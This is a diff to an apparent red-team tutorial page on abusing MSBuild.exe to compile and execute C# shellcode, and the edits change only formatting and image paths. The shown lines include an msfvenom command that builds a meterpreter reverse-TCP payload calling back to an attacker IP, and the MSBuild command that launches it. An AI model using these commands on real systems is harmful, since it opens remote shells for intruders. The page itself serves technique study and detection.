@@ -1,10 +1,10 @@
 # Using MSBuild to Execute Shellcode in C\#
 
-It's possible to use a native windows binary MSBuild.exe to compile and execute inline C\# code stored in an xml as discovered by [Casey Smith](https://twitter.com/subTee).
+It's possible to use a native windows binary MSBuild.exe to compile and execute inline C# code stored in an xml as discovered by [Casey Smith](https://twitter.com/subTee).
 
 ## Execution
 
-Generate meterpreter shellode in c\#:
+Generate meterpreter shellode in c#:
 
 {% code title="attacker@kali" %}
 ```csharp
@@ -12,7 +12,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2019-04-04-20-53-21.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-04 20-53-21.png>)
 
 Insert shellcode into the shellcode variable in linne 46:
 
@@ -84,7 +84,7 @@ Insert shellcode into the shellcode variable in linne 46:
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2019-04-04-20-54-14.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-04 20-54-14.png>)
 
 Spin up a handler in metasploit to catch your shell:
 
@@ -102,7 +102,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/peek-2019-04-04-20-57.gif)
+![](<../../.gitbook/assets/Peek 2019-04-04 20-57.gif>)
 
 ## Observation
 
@@ -111,6 +111,4 @@ Note that it's MSBuild.exe that will make the TCP connection to the attacker, so
 ## References
 
 [https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17](https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17)
-
-
 
